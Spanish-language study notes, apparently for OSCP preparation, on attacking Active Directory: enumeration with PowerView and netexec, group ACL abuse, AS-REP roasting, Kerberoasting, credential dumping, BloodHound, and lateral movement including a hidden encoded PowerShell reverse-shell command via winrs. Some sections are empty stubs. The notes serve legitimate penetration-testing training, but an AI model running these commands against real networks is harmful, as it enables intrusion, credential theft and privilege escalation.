

## Metodología


1. Usar credenciales iniciales (o acceso anónimo si fuera posible) para conectarnos a una máquina del dominio. Realizar enumeración básica: puertos, servicios, acceso anónimo a SMB/FTP... Si no tenemos usuarios, intentar enumerarlos con `netexec`
    
2. Ejecuta `enum4linux-ng` o `netexec` para obtener información del dominio: usuarios, grupos, políticas de contraseñas, máquinas.
    
3. Si tienes credenciales válidas, realiza un volcado de secretos (con `mimikatz`, `secretsdump.py` de impacket) para obtener hashes NTLM.
    
4. Almacena todos los hashes en `hashes.txt` y pruébalos con `hashcat` (modo 1000) o úsalos directamente con `crackmapexec` para movimiento lateral.
    
5. Realiza técnicas rápidas de escalada:
    
    - **AS-Rep Roast**: para usuarios con Kerberos pre-authentication deshabilitada.
        
    - **Kerberoasting**: solicita TGS para cuentas de servicio y extrae hashes con `GetUserSPNs.py`.
        
6. Consulta LDAP (`ldapsearch`, `ldapdomaindump`) para mapear relaciones de permisos, grupos privilegiados (como Domain Admins), y objetos inusuales.
    
7. Usa `crackmapexec` para hacer spray de credenciales o hashes a través de todas las máquinas del dominio. Busca accesos con privilegios (Pwn3d!).
    
8. Al obtener acceso a una nueva máquina, repetir el proceso desde el paso 3, ampliando tu acceso.

---


## Enumeración manual


Enumerar usuarios del dominio
```powershell
net user /domain
```

Enumerar info de un usuario
```powershell
net user usuario /domain
```


Enumerar grupos
```powershell
net group /domain
```


Enumerar usuarios de un grupo
```powershell
net group "grupo" /domain
```



---


## Powerview


Importamos el módulo
```powershell
Import-Module .\PowerView.ps1
```


 Info básica del dominio
 ```powershell
 Get-NetDomain
 ```


Enumeración usuarios
```powershell
Get-NetUser
```

Filtrado de usuarios únicamente por nombre ***Con select podemos seleccionar los parámetros que queramos del Get-NetUser***
```powershell
Get-NetUser | select cn
```


Enumeración de grupos
```powershell
Get-NetGroup
```

Filtrado por nombre del grupo (igual que con los usuarios)
```powershell
Get-NetGroup | select cn
```


Enumerar grupos específicos
```powershell
Get-NetGroup "n_grupo" | select member
```


Enumerar objetos del ordenador en el dominio
```powershell
Get-NetComputer
```


Enumerar ACL de un objeto
```powershell
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```


Listar spn de las cuentas en el dominio
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname

#si resulta que el serviceprincipalname tiene una web: --> nslookup.exe n_web.dominio.com
```


Enumerar usuarios logados en un cliente
```powershell
.\PsLoggedon.exe \\files04
```


### ACL

```python
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```


Enumerar ACL de un usuario
```powershell
Get-ObjectAcl -Identity n_usuario

#Podemos convertir SID a texto para ver a quien pertenece esa ACL:

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```


Enumerar ACL en grupos
```powershell
Get-ObjectAcl -Identity "n_grupo" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

#Recordatorio que select es para filtrar el output
```


En el caso de que podamos unirnos a grupos
```powershell
net group "n_grupo_al_que_añadirnos" n_user_a_añadir /add /domain

#Podemos comprobar que ha surtido efecto con: Get-NetGroup "n_grupo" | select member
```

Tambien nos podremos eliminar del grupo
```powershell
net group "n_grupo" n_usuario /del /domain
```


---

## Enumeración de shares en dominio

***Usamos `Powerview`***

Listamos los compartidos del dominio
```powershell
Find-DomainShare
```

Una vez listado, nos podemos mover como con linux
```powershell
ls --> listamos
cat --> leemos

Tenemos que poner el dominio delante de lo que vayamos a listar o leer:

ls \\dominio.com\ejemplo
```


Puede ser que nos encontremos con contraseñas antiguas de una politica de dominio antigua (old.policy-backup por ejemplo es un indicativo de que podría serlo); para descifrarlas podemos usar gpp-decrypt
```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```




---


## Enumeración de usuarios



```bash
netexec servicio $target -u '' -p '' --rid-brute #--> servicio=smb o ldap o rdp...
```


---

## AS-Rep Roasting


Los usuarios vulnerables a **AS-REP Roasting** son aquellos con la **autenticación previa de Kerberos deshabilitada** (`Do not require Kerberos preauthentication`). Permitiéndonos solicitar un TGT (Ticket Granting Ticket) sin necesidad de autenticarse primero.

Para detectarlos:

1. **Enumeración mediante LDAP**: Usar herramientas como `ldapsearch` o `PowerView` para buscar cuentas con el atributo `UF_DONT_REQUIRE_PREAUTH` activado.
   
- Ejemplo con `crackmapexec`:

```
crackmapexec ldap <IP_DC> -u '<usuario>' -p '<contraseña>' --kdcHost <dominio> --users --preauth-not-required
```
   
- Ejemplo con `PowerView` (desde PowerShell):

```
Get-DomainUser -PreauthNotRequired -Properties distinguishedname,samaccountname
```

2. **Uso de herramientas específicas**: `ASREPRoast.py` (de Impacket) puede usarse directamente para probar si un usuario devuelve un TGT rostable.




### ¿Cómo extraer un TGT para AS-Rep Roasting?


Las herramientas principales para extraer un TGT en un ataque de **AS-REP Roasting** son:

- **`GetNPUsers.py`** (parte de Impacket): Solicita TGTs a usuarios con preautenticación Kerberos deshabilitada y extrae el hash del AS-REP.

```
python3 GetNPUsers.py DOMAIN/user -request -format hashcat -outputfile hashes.asrep
```

- **`Rubeus.exe`**: Automatiza la extracción de hashes AS-REP desde Windows.
   
```
Rubeus.exe asreproast /format:hashcat /outfile:hashes.asrep
```

- **`netexec`**: Permite realizar AS-REP Roasting directamente desde Linux.
   
```
netexec ldap <DC_IP> -u <user> -p <pass> --asreproast asrep_hashes.txt
```


Una vez extraído el hash (en formato `$krb5asrep$`), podemos crackearlo con **Hashcat** (modo `18200`) o **John the Ripper** (**Para la OSCP usaremos principalmente rockyou**)


---


## Kerberoast


Las herramientas principales para extraer un TGS en un ataque de **Kerberoasting** son:

- **`GetUserSPNs.py`** (de Impacket): Desde Linux, solicita y extrae TGS para cuentas con SPN.

```bash
impacket-GetUserSPNs DOMAIN/user:password -request -dc-ip <IP_DC> -outputfile hashes.kerberoast
```

- **`Rubeus.exe`**: Desde Windows, automatiza la enumeración y extracción de TGS.

```powershell
Rubeus.exe kerberoast /outfile:hashes.kerberoast /format:hashcat
```

- **`Mimikatz`**: Extrae TGS directamente desde la memoria del sistema.

```powershell
kerberos::list /export
```

- **`Invoke-Kerberoast`** (PowerShell): Parte de PowerSploit, útil en entornos Windows.

```powershell
Invoke-Kerberoast -OutputFormat HashCat | Select-Object Hash | Out-File -Encoding ASCII hashes.txt
```


Los hashes extraídos (en formato `$krb5tgs$`) se crackean con **Hashcat** (modo `13100`) o **John the Ripper**.


---


## Sharphound

[Descarga de Sharphound](https://github.com/SpecterOps/SharpHound/releases)


Nos lo pasamos a la máquina Windows
```powershell
powershell -ep bypass

Import-Module .\Sharphound.ps1
```

**Enumeración**

Enumeración de todos los datos salvo las políticas de grupo locales
```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\ruta\donde\guardar\el\output -OutputPrefix "corp audit"
```


---

## Bloodhound


Para usar BloodHound necesitamos iniciar el servicio de `Neo4j` (está instalado de forma predeterminada en kali)
```bash
sudo neo4j start

#Nos sale el pid y el puerto por el que estará el servicio

#Credenciales por defecto neo4j:neo4j --> nueva pass p3licano
```


Iniciamos `bloodhound`
```bash
bloodhound

#Nos logueamos con las credenciales de la bbdd de neo4j
```


---


## Movimiento lateral


### WMI y WinRM


**WMI** (Windowsm Management Instrumentation) Permite crear procesos remoto por RPC

wmic /node:IP_NODO /user:usuario /password:pass



![[Pasted image 20260420173858.png]]


Podemos usar WinRM como alternativa a WMI, para ello, podemos usar ***evilwinrm*** o su herramienta nativa winrs:

```powershell

#Nom_dominio = hostname

winrs -r:nom_dominio -u:user -p:pass "cmd /c hostname & whoami" --> ejecución de comandos


winrs -r:files04 -u:user -p:pass "powershell -nop -w hidden -e..." --> Ejecutamos una revshell
```


WinRM en powershell

```powershell
$username='nom';
$password='pass';
$secureString=ConvertTo-SecureString $password -AsPlaintext -Force;

$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential


#Luego

Enter-PSSession 1

whoami
```



### PSexec

Crea un servicio y un binario en la máquina víctima, a su vez de un canal de cpmunicación

1º PSexec se conecta al compartido de $Admin (debemos de ser admin o pertenecer al grupo de admin)

2º


```powershell
.\PsExec64.exe -i  \\dominio -u corp\nom -p pass cmd

#Ya podríamos ejecutar comandos como admin
```



### Pass the Hash

Nos permite autenticarnos de manera remota a un sistema o servicio usando el hash NTLM de un usuario en vez de su contraseña (no funciona para la autenticación con kerberos)


```powershell

```


### Overpass the hash

Abusamos de la autenticación de kerberos y autenticarnos con el tgt gracias al hash NTLM de otro usuario



### Pass the ticket


**Coger el ticket "cifs"**

Nos aprovechamos del TGS exportandolo y reinyectandolo en otra parte de la red


### DCOM (no debería de entrar en la OSCP)


Es un sistema de creación de componentes de software para que interactuar entre ellos a traves de RPC


### Shadow copies

```powershell
vshadow.exe -nw -p VOL_DISCO:
```

